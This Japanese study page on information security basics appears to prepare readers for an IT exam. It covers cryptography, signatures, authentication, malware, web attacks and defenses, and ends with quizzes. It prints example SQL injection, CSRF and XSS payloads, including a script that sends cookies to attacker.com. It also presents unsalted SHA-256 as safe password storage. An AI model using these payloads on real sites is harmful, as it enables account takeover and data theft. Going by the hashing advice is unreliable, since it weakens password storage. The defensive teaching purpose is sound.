## このページの役割

このページは、`情報セキュリティの基礎` を整理する知識ノードです。`守る対象と目的`、`暗号化と認証の仕組み`、`脅威の種類と対策` を 1 本の流れで押さえます。

## 学習のポイント

- まず `CIA` と 4 要素で `何を守るか` を定義する
- 次に `暗号化 / ハッシュ / 電子署名 / 認証` の役割を分ける
- そのうえで `マルウェア / Web 攻撃 / その他脅威` の種類と対策を読む

## 試験で何が問われるか

- `CIA` と `真正性 / 責任追跡性 / 否認防止 / 信頼性` の 7 要素を説明できるか
- `共通鍵暗号` と `公開鍵暗号` の仕組みと、鍵の個数計算ができるか
- `ハッシュ関数` と `デジタル署名` の目的と手順を言えるか
- `認証` の 3 要素（知識 / 所持 / 生体）と多要素認証が説明できるか
- `マルウェア / SQL インジェクション / XSS / CSRF` を対象と防御策で分けられるか
- `ファイアウォール / IDS / IPS / VPN / ゼロトラスト` の位置づけが分けられるか

## 定義と仕組み

### セキュリティの 3 要素 (CIA) と 4 要素

情報セキュリティで守る対象は、次の 7 つです：

| 要素 | 説明 |
|------|------|
| **機密性 (Confidentiality)** | 許可された人だけが情報にアクセスできること |
| **完全性 (Integrity)** | 情報が改ざんされていないこと |
| **可用性 (Availability)** | 必要な時に情報やサービスが使える状態 |
| **真正性 (Authenticity)** | 通信相手や情報の出所が本物であること |
| **責任追跡性 (Accountability)** | 誰が何をしたか記録に残り、追跡できること |
| **否認防止 (Non-repudiation)** | 本人が行動や通信を後で否定できないこと |
| **信頼性 (Reliability)** | システムが正常に機能し続けること |

暗号化は **機密性** を守り、ハッシュは **完全性** を確認し、電子署名は **真正性** と **否認防止** を実現します。

### 暗号化方式

#### 共通鍵暗号 (対称鍵暗号)

同じ鍵で暗号化と復号化を行います。

| 特徴 | 詳細 |
|------|------|
| **仕組み** | 送信者と受信者が同じ鍵を持つ |
| **処理速度** | 速い |
| **鍵配送** | 事前に安全に鍵を共有する必要がある（鍵配送問題） |
| **n 人での鍵個数** | `n(n-1)/2` 本 |
| **代表例** | AES、DES、3DES |

**鍵の個数計算例（10 人の場合）**

10 人が各自 1 対 1 で通信する場合、それぞれのペアに異なる鍵が必要です。

鍵の個数 = `10 × 9 ÷ 2 = 45 本`

10 人のグループで、AさんがBさんと通信する場合、その鍵をC〜Jさんとは共有できません。

#### 公開鍵暗号 (非対称鍵暗号)

異なる 2 つの鍵を使います：公開鍵（誰でも知ってよい）と秘密鍵（本人だけが持つ）。

| 特徴 | 詳細 |
|------|------|
| **仕組み** | 公開鍵で暗号化 → 秘密鍵で復号化 |
| **処理速度** | 遅い |
| **鍵配送** | 公開鍵は公開してよいので配送問題がない |
| **n 人での鍵個数** | `2n` 個（各人が公開鍵 + 秘密鍵を 1 組） |
| **代表例** | RSA、楕円曲線暗号（ECC） |

**鍵の個数計算例（10 人の場合）**

10 人が各自、公開鍵 1 つ + 秘密鍵 1 つを持ちます。

鍵の個数 = `2 × 10 = 20 個`

AさんがB〜Jさんと通信する場合、Bさんの公開鍵さえあればよく、B〜Jさんとの間で秘密鍵を共有する必要はありません。

#### ハイブリッド暗号

公開鍵暗号は遅いため、実際には次のように使い分けます：

1. **通信データ** = 共通鍵で暗号化（速い）
2. **共通鍵そのもの** = 公開鍵で暗号化（鍵の安全配送）

この組み合わせを **ハイブリッド暗号** と呼びます。SSL/TLS や HTTPS がこの方式です。

### ハッシュ関数

ハッシュ関数は、任意の長さの入力から固定長の値（ハッシュ値）を生成する一方向関数です。

| 特性 | 説明 |
|------|------|
| **一方向性** | ハッシュ値から元のデータを復元できない |
| **衝突耐性** | 異なるデータから同じハッシュ値が出にくい（強衝突耐性） |
| **変更検知性** | データが少し変わると、ハッシュ値が大きく変わる |

| 関数 | ハッシュ値の長さ | 用途 | 現在の評価 |
|------|------|------|---------|
| **MD5** | 128 ビット | パスワードハッシュ、ファイル整合性確認 | 脆弱（衝突攻撃が可能） |
| **SHA-1** | 160 ビット | デジタル署名、TLS/SSL | 脆弱（衝突が報告されている） |
| **SHA-256** | 256 ビット | セキュリティが必要な場面全般 | 強（現在推奨） |
| **SHA-3** | 224/256/384/512 ビット | 最新仕様 | 強（将来の標準） |

**用途例**

- **パスワード保存**：データベースに `SHA-256(パスワード)` を保存。ハッキングされても元のパスワードは復元不可
- **ファイル整合性確認**：ダウンロード前後でハッシュ値を比較し、改ざんを検知
- **デジタル署名**：ドキュメントのハッシュ値に署名する

### デジタル署名

デジタル署名は、データの出所が本物であること（真正性）と、データが改ざんされていないこと、そして本人がそのデータを送信したことを否定できないこと（否認防止）を実現します。

**5 ステップの手順**

| ステップ | 操作 | 鍵 | 結果 |
|---------|------|------|------|
| **1. ハッシュ生成** | ドキュメント → ハッシュ関数 | なし | ハッシュ値 H |
| **2. ハッシュに署名** | H → **秘密鍵で暗号化** | 秘密鍵 | デジタル署名 S |
| **3. 署名付きドキュメント送信** | ドキュメント + 署名 S を送信 | - | 受信者へ到達 |
| **4. ハッシュ生成（受信者）** | 受信ドキュメント → ハッシュ関数 | なし | ハッシュ値 H' |
| **5. 署名検証** | S → **公開鍵で復号化** → H'' と H' を比較 | 公開鍵 | H' == H'' なら本物 |

**暗号化との違い（鍵の使用順序）**

| 目的 | 鍵の使用順序 | 秘密鍵の所有者 |
|------|------------|-----------|
| **機密性（暗号化）** | 公開鍵で暗号化 → 秘密鍵で復号化 | 受信者 |
| **真正性・否認防止（デジタル署名）** | 秘密鍵で暗号化 → 公開鍵で復号化 | 送信者 |

### 認証技術

認証は、ユーザーが本人であることを確認するプロセスです。

#### 3 つの認証要素

| 要素 | 方法 | 例 |
|------|------|------|
| **知識要素 (Something you know)** | ユーザーが知っている情報 | パスワード、秘密の質問 |
| **所持要素 (Something you have)** | ユーザーが持っているもの | スマートフォン、セキュリティキー、ICカード |
| **生体要素 (Something you are)** | ユーザーの身体特性 | 指紋、顔、虹彩、音声 |

#### 多要素認証 (MFA: Multi-Factor Authentication)

複数の異なる要素を組み合わせて認証強度を高めます。

| 方式 | 構成 | 強度 |
|------|------|------|
| **知識のみ** | パスワード | 低（漏洩のリスク） |
| **知識 + 所持** | パスワード + SMS コード | 中（標準的） |
| **知識 + 生体** | パスワード + 指紋 | 高（推奨） |
| **所持 + 生体** | スマートフォン + 顔認証 | 高 |
| **3 要素全て** | パスワード + セキュリティキー + 指紋 | 最高（金融機関など） |

#### シングルサインオン (SSO)

複数のサービスに 1 回の認証でアクセスできる仕組み。

| プロトコル | 役割 | 用途 |
|-----------|------|------|
| **SAML (Security Assertion Markup Language)** | 認証情報を XML で送信 | エンタープライズ SSO（社内システム連携） |
| **OAuth 2.0** | 認可情報を安全に委譲 | サードパーティサービスへのアクセス（Google ログイン等） |
| **FIDO (Fast IDentity Online)** | パスワードレス認証 | 生体認証 + セキュリティキーによる強力な認証 |

### 公開鍵基盤 (PKI: Public Key Infrastructure)

PKI は、公開鍵の信頼性を確保するための体制です。

| 要素 | 役割 |
|------|------|
| **認証局 (CA: Certification Authority)** | 公開鍵の真正性を確認し、電子証明書を発行・失効管理 |
| **登録局 (RA: Registration Authority)** | ユーザー身元確認、CA への申請を処理 |
| **電子証明書** | ユーザー（または組織）、公開鍵、有効期限、CA 署名を含むデータ |
| **CRL (Certificate Revocation List)** | 失効した証明書のリスト（例：キーの漏洩時に失効） |
| **OCSP (Online Certificate Status Protocol)** | 証明書の有効性をリアルタイムで確認 |

HTTPS 通信では、Web サイトの身分を示す証明書を CA が発行し、ブラウザがその証明書を検証しています。

### 暗号化・認証まとめ

<Callout title="暗号化と認証の使い分け">
- **暗号化 (encryption)** = データを読めなくする（機密性を守る）
- **認証 (authentication)** = 通信相手が本物か確認する（真正性を確認する）
- **デジタル署名** = ハッシュ値を秘密鍵で署名し、真正性と否認防止を実現
- **ハッシュ関数** = データの改ざんを検知（完全性確認）
</Callout>

## マルウェアと脅威

### マルウェアの種類

| 種類 | 特徴 | 感染方法 | 影響 |
|------|------|--------|------|
| **ウイルス** | 自己増殖する。プログラムに寄生 | 感染ファイル実行時 | データ破壊、情報盗取 |
| **ワーム** | 自己増殖する。独立したプログラム | ネットワーク経由（パッチ未適用など） | ネットワーク通信の大量発生 |
| **トロイの木馬** | 自己増殖しない。無害に見えるが裏で悪意ある処理 | ダウンロード、メール添付 | 情報盗取、遠隔操作 |
| **ランサムウェア** | ファイルを暗号化し、復号化キーの身代金を要求 | メール添付、脆弱性悪用 | 事業停止、経済的被害 |
| **スパイウェア** | ユーザーの行動や情報を収集 | フリーソフト、広告サイト | プライバシー侵害、スロー化 |
| **ボット（ボットネット）** | 遠隔から操作される。DDoS 攻撃に悪用 | ワーム＋トロイの木馬のような感染 | 攻撃のリソース化 |

### Web 攻撃

#### 主要な 3 つの Web 攻撃比較

| 攻撃 | 攻撃対象 | 仕組み | 防御策 |
|-----|--------|------|--------|
| **SQLインジェクション** | **サーバー側のデータベース** | 入力欄に SQL を混ぜ込み、不正な SQL クエリを実行 | 入力値の検証・サニタイズ、プリペアドステートメント |
| **XSS (クロスサイトスクリプティング)** | **クライアント側のブラウザ** | 入力欄に JavaScript を埋め込み、他のユーザーが訪問時に悪意あるスクリプト実行 | 入力値のエスケープ、CSP（コンテンツセキュリティポリシー） |
| **CSRF (クロスサイトリクエストフォージェリ)** | **認証済みユーザーの権限** | 別サイトから認証済みセッションの操作を強制 | CSRF トークン、SameSite クッキー属性 |

**詳細例**

1. **SQL インジェクション**

   ユーザー名入力欄に `' OR '1'='1` を入力 → `SELECT * FROM users WHERE name='' OR '1'='1'` となり、全ユーザー情報を取得

2. **XSS**

   コメント欄に `<script>alert('XSS')</script>` を入力 → 他のユーザーがそのページを訪問すると、スクリプトが実行される

3. **CSRF**

   認証済みユーザーが別サイトを訪問 → そのサイトが `<img src="bank.com/transfer?to=attacker&amount=1000000">` を埋め込む → ユーザーは気づかずに送金される

### その他の脅威

| 脅威 | 説明 | 対策 |
|------|------|------|
| **フィッシング** | メール等で偽サイトへ誘導し、パスワードやカード情報を窃取 | メール認証（DMARC、SPF、DKIM）、ユーザー教育 |
| **標的型攻撃** | 特定組織の従業員を狙ったメール送信 → 潜在的な脅威をインストール | ファイアウォール、メールフィルタリング、EDR |
| **ブルートフォース攻撃** | パスワードを総当たりで試す | パスワード複雑化、ロック機能、多要素認証 |
| **ゼロデイ脆弱性** | 未発見の脆弱性を悪用 | パッチ管理、IPS/WAF、ソースコード監査 |
| **ソーシャルエンジニアリング** | 人的な隙をついて情報を窃取 | ユーザー教育、内部統制、監査ログ |
| **サプライチェーン攻撃** | 納入業者を経由して攻撃 | ベンダー管理、最小権限の原則、監視 |

## セキュリティ対策技術

### ネットワークセキュリティ対策

| 技術 | 位置 | 役割 | 対象 |
|------|------|------|------|
| **ファイアウォール** | ネットワーク境界 | 許可されていないトラフィックをブロック | ネットワーク全体 |
| **WAF (Web Application Firewall)** | Web アプリケーション前面 | SQL インジェクション、XSS などの Web 攻撃を検知・ブロック | Web アプリケーション |
| **IDS (Intrusion Detection System)** | ネットワーク内 | 不正な通信を検知（検知のみ） | ネットワーク全体 |
| **IPS (Intrusion Prevention System)** | ネットワーク内 | 不正な通信を検知してブロック（検知 + 防止） | ネットワーク全体 |
| **DMZ (Demilitarized Zone)** | ネットワーク構成 | 内部ネットワークと外部ネットワークの間の隔離エリア | インターネット接続サーバ |
| **VPN (Virtual Private Network)** | 通信経路 | 公開回線上に暗号化された仮想プライベートネットワークを構築 | リモートアクセス、支社間通信 |
| **UTM (Unified Threat Management)** | ネットワーク境界 | ファイアウォール、IPS、メールフィルタ、Web フィルタ等を統合 | ネットワーク全体 |
| **サンドボックス** | ホスト / クラウド | 隔離された環境で疑わしいファイルを実行・検査 | マルウェア検出 |
| **EDR (Endpoint Detection and Response)** | クライアント / サーバ | エンドポイント（PC、サーバ）上で疑わしい活動を検知・対応 | 端末 |
| **SIEM (Security Information and Event Management)** | 集約・監視 | ネットワーク全体のログを集約し、異常を検知 | 全体監視 |

### VPN の種類

VPN は、公開回線（インターネット）上で暗号化された仮想的なプライベートネットワークを構築します。

| VPN 種類 | プロトコル | 用途 | 特徴 |
|---------|-----------|------|------|
| **IPsec VPN** | IPsec | 企業間通信、支社間接続 | ネットワーク層で暗号化、ルータレベル |
| **SSL VPN** | SSL/TLS | リモートアクセス（在宅勤務等） | アプリケーション層で暗号化、ブラウザ対応 |
| **IP-VPN** | 専用線（キャリア提供） | 企業間・支社間通信 | 公衆網上の専用線、キャリアが管理 |

### ゼロトラスト

従来のネットワークセキュリティ（境界型防御）では、ファイアウォールで外部を遮断し、内部は信頼する想定でした。しかし内部脅威やテレワーク拡大により、この前提が崩壊しています。

#### 従来型（境界型防御）vs ゼロトラスト

| 観点 | 従来型（境界防御） | ゼロトラスト |
|------|-----------|-----------|
| **信頼の前提** | 境界内 = 信頼、境界外 = 不信頼 | すべてを不信頼と仮定 |
| **検証** | 初回認証後は検証しない | すべての通信・アクセスを毎回検証 |
| **ネットワーク分割** | 単純（内 / 外） | 細かくセグメント化 |
| **アクセス制御** | 広い権限付与 | 最小権限の原則（必要最小限） |
| **適用範囲** | ネットワーク境界 | ユーザー、デバイス、アプリケーション、データ |

**ゼロトラストの 7 つの基本原則**

1. **検証を前提にする** → すべてのユーザー、デバイス、通信を検証
2. **最小権限の原則** → 必要最小限のアクセスのみ許可
3. **マイクロセグメンテーション** → ネットワークを細かく分割
4. **継続的な監視** → すべての活動をログ、監視
5. **多要素認証** → MFA を必須に
6. **デバイスセキュリティ** → エンドポイント保護を強化
7. **データ保護** → 暗号化、アクセス制御でデータを守る

## ISMS とセキュリティ関連規格

| 規格 / 基準 | 概要 | 対象 |
|-----------|------|------|
| **ISO/IEC 27001** | 情報セキュリティマネジメントシステム（ISMS）の要件 | 組織全体 |
| **ISO/IEC 27002** | ISO 27001 の管理策（コントロール）の詳細ガイドライン | 対策設計 |
| **個人情報保護方針ガイドライン** | 個人情報取扱事業者向けのガイドライン | 個人情報 |
| **FISC（金融情報システムセンター）安全基準** | 金融機関向けのセキュリティ基準 | 金融機関 |
| **NIST Cybersecurity Framework** | サイバーセキュリティフレームワーク（米国） | リスク管理 |

## 典型的なつまずき

<Callout title="よくある混同">
- `暗号化` と `ハッシュ` を同じものと思う（暗号化は復号化できる、ハッシュはできない）
- `デジタル署名` の秘密鍵と公開鍵の役割を逆に覚える
- `認証` と `認可` を同じと思う（認証は本人確認、認可はアクセス権限）
- `SQL インジェクション` は DB 狙い、`XSS` はブラウザ狙い、という違いを見落とす
- `ファイアウォール` で全ての攻撃を防げると思う（内部脅威や高度な攻撃は通過する）
</Callout>

## 問題を解くときの観点

- **何を守るのか** = CIA のどれか、または 7 要素のどれか
- **どの技術で守るのか** = 暗号化か、ハッシュか、認証か、対策技術か
- **鍵の個数が問われたら** = 共通鍵か公開鍵か、計算式を使う
- **脅威が問われたら** = マルウェア種別か、Web 攻撃か、その他脅威か
- **対策技術が問われたら** = ネットワーク層か、アプリケーション層か、エンドポイント層か

## 確認問題

<Callout title="確認問題 1：鍵の個数計算">
ある企業が 5 支社で情報共有システムを構築します。支社間通信の暗号化について、次の 2 つのシナリオで必要な鍵の本数（個数）を計算してください。

（1）各支社が共通鍵暗号で 1 対 1 に安全に通信する場合、必要な鍵は何本か。

（2）各支社が公開鍵暗号を使用する場合、必要な鍵（公開鍵 + 秘密鍵）は何個か。

---

**解答例**

（1）共通鍵暗号：各ペアに異なる鍵が必要

鍵の本数 = `5 × 4 ÷ 2 = 10 本`

5 支社から 2 つを選ぶ組み合わせ = C(5,2) = 10

（2）公開鍵暗号：各支社が公開鍵 1 つ + 秘密鍵 1 つ

鍵の個数 = `2 × 5 = 10 個`

支社数に関わらず、全支社が全支社と安全に通信できる。
</Callout>

<Callout title="確認問題 2：デジタル署名の手順">
A さんが B さんに重要なドキュメントを送信し、そのドキュメントが A さんから送られたこと（真正性）と改ざんされていないこと（完全性）を証明したいとします。デジタル署名の 5 つのステップを日本語で説明し、各ステップで使用する鍵を明記してください。

---

**解答例**

1. **ハッシュ生成**：ドキュメント → ハッシュ関数 → ハッシュ値 H を生成（鍵不使用）

2. **署名生成**：ハッシュ値 H → A の秘密鍵で暗号化 → デジタル署名 S（秘密鍵使用）

3. **送信**：ドキュメント + デジタル署名 S を B に送信

4. **ハッシュ検証**：受信したドキュメント → ハッシュ関数 → ハッシュ値 H' を生成（鍵不使用）

5. **署名検証**：デジタル署名 S → A の公開鍵で復号化 → H'' を取得（公開鍵使用）
   - H' == H'' なら署名は有効（A が署名した本物のドキュメント）
   - H' ≠ H'' なら改ざんされた可能性
</Callout>

<Callout title="確認問題 3：Web 攻撃の判定">
次の 3 つのシナリオで、どの Web 攻撃に該当し、どのような防御策が有効か答えてください。

（A）会員サイトのコメント欄に `<script>document.location='https://attacker.com/steal.html?cookie='+document.cookie</script>` が投稿される

（B）ショッピングサイトの検索欄に `' OR '1'='1` が入力されると、全商品の情報が表示される

（C）ユーザーが認証済みの銀行サイトを開いている状態で、別タブで攻撃者のサイトを訪問すると、銀行への送金操作が実行される

---

**解答例**

（A）XSS（クロスサイトスクリプティング）
- 他ユーザーがコメントを見た時、スクリプトが実行されて Cookie が盗まれる
- 防御策：入力値のエスケープ処理、Content-Security-Policy（CSP）ヘッダの設定

（B）SQL インジェクション
- 検索 SQL が `SELECT * FROM products WHERE name='' OR '1'='1'` となり、全商品が取得される
- 防御策：プリペアドステートメント、入力値の検証・サニタイズ

（C）CSRF（クロスサイトリクエストフォージェリ）
- ユーザーが認証済みセッションを持った状態で、別サイトの操作が強制される
- 防御策：CSRF トークンの検証、SameSite クッキー属性の設定
</Callout>
